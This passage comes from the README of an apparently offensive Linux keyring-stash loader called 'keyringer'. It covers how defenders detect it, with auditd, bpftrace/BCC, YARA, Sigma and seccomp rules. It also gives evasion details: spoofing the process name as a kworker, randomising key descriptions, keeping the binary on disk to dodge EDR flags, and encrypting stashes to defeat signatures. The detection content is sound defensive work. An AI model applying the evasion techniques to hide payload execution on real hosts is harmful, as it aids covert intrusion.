  watch -n0.1 "grep _keyringer /proc/keys"
  ```

  Attackers randomize against this with `--desc`.
- **After revoke**, keys linger in `/proc/keys` (flag `R`, size 0) until the
  kernel GC unlinks them, and `request_key` on them returns `EKEYREVOKED` — a
  consumed stash cannot be silently replayed.
- **Hunt rules**: the repo ships its own — see `detections/` below.
  Hand-rolled equivalents: auditd/eBPF rules on the `add_key`/`keyctl`
  syscall patterns catch the whole class, e.g.
  `auditctl -a always,exit -F arch=b64 -S add_key -k keyring_stash`; also flag
  `prctl(PR_SET_NAME)` followed by heavy `mmap`/`mprotect(PROT_EXEC)` activity
  in the same process.
- **Trust fd/maps telemetry over process names.** `/proc/<pid>/cmdline` and
  `comm` are spoofable by this class of tool (`kworker/u8:2` by default);
  `/proc/<pid>/maps` and fd contents are not.
- **The loader binary stays on disk deliberately**: unlinking it would make
  `/proc/self/exe` end in `(deleted)`, which EDRs flag.
- **Encrypted stashes** (`--key`) defeat payload string signatures in memory
  and keyring forensics — but not a root operator, who can read your keys
  directly. `--selfcontained` interpreter chunks stay plaintext by design.

### Shipped detectors (`detections/`)

The tool ships its own detections:

- `kr_hunt.py` — BCC-based live detector. Correlates, per pid and within a
  `--window` (default 2 s): at least one `add_key("user")`, `keyctl`
  READ(11)/REVOKE(3) on serials that pid's own `add_key` returned (serial
  attribution via the `sys_exit_add_key` tracepoint), and a `PROT_EXEC`
  mmap/mprotect — with `prctl(PR_SET_NAME)` recorded as supporting evidence.
  Prints `KEYRING-STASH->USERLAND-EXEC` alerts with timestamp, pid, comm,
  stash descriptions and serials; `-v` logs every raw event. Run as root,
  needs the `bcc` package. Kernel caveat: it attaches the
  `sys_enter_add_key` syscall tracepoint, which this PVE kernel silently
  never delivers (see `kr_hunt.bt` above) — on such kernels its correlation
  cannot fire and `kr_hunt.bt` is the live detector.
- `kr_hunt.bt` — bpftrace detector printing per-event lines: `add_key`
  (kprobe on `__x64_sys_add_key` — this PVE kernel never delivers events
  from the `sys_enter_add_key` *tracepoint*, while `keyctl`'s tracepoint
  works; strace + kprobe confirm the syscall itself fires), `keyctl`
  READ/REVOKE plus UPDATE/SEARCH/GET_PERSISTENT — the latter three are the
  **keepalive signature** (keyring churn with no `add_key`) — exec `mmap`,
  exec `mprotect`, `PR_SET_NAME`; correlate pid/comm by hand. Verified live:
  caught the stash `add_key → READ, READ, REVOKE → RWX map` chain under the
  spoofed comm, and repeating `GET_PERSISTENT`+`SEARCH` pairs from
  `keepalive`.
- `keyringer-loader.yara` — YARA rules identifying the loader and its kin
  (Dntry-class tools) on disk or in memory dumps, plus the Python twin
  source. `Keyringer_Loader` covers ELF files: CLI strings (`kstdin`,
  `kfile`, `khttp`, `selftest`), the spoof name, library exports
  (`kr_stash`, `kr_load_revoke`), the `KRH1`/`KR1` wire magics, the AF_ALG
  algorithm name `rfc7539(chacha20,poly1305)`, and the `KAG1` agent magic.
  `Keyringer_Python_Twin` fires on non-ELF sources carrying `KR_VERSION`
  plus wire/syscall markers. Verified live: fires on `keyringer`,
  `keyringer-dyn` and `libkeyringer.so` (Loader rule) and on
  `keyringer.py` (Twin rule); silent on clean ELFs.
- `keyringer-hunt.sigma` — auditd Sigma rule for the stash pattern:
  `add_key` (`user` or `big_key` chunk types) followed by `keyctl` READ +
  REVOKE in near proximity from the same process with **no `execve`** (the
  process keeps its PID throughout), plus a second alternative for the
  keepalive signature (repeating `GET_PERSISTENT`/`SEARCH`). Tagged
  `attack.t1620` (Reflective Code Loading) and `attack.t1564.001`
  (Hidden Artifacts).
- `ausearch-hunt.sh` — post-hoc auditd hunt for operators whose hosts run
  auditd: for each PID that performed `add_key` + `keyctl(READ)` +
  `keyctl(REVOKE)`, checks whether the same PID also `execve`d; stash
  loaders never do. Needs `auditd-keyringer.rules` loaded. Precise status
  on this box: auditd is installed, but the host kernel boots with
  `audit=0`, so the audit netlink socket is unavailable and rules cannot be
  loaded or the hunt exercised here — the rule set ships syntax-checked;
  live validation needs a host booted with `audit=1` (any stock distro
  kernel).
- `keyringer-deny.seccomp.json` — prevention, not observation: a Docker/
  containerd seccomp overlay profile (default-allow) that makes
  `add_key`/`request_key`/`keyctl` fail with `EPERM`, breaking this loader
  class at phase 1 for daemons that have no business touching the keyring.
- `auditd-keyringer.rules` — auditd rules (`-S add_key -S keyctl`, key
  `keyring_stash`) feeding the Sigma rule and hunt script. Same `audit=0`
  caveat as above; loadable and testable on any audit-enabled host.

Kernel quirk worth knowing when writing your own: syscall tracepoint fields
follow the syscall's parameter names, so keyctl's cmd argument is `option`
(`args->option == 11` is KEYCTL_READ), while add_key's payload length is
`plen`.
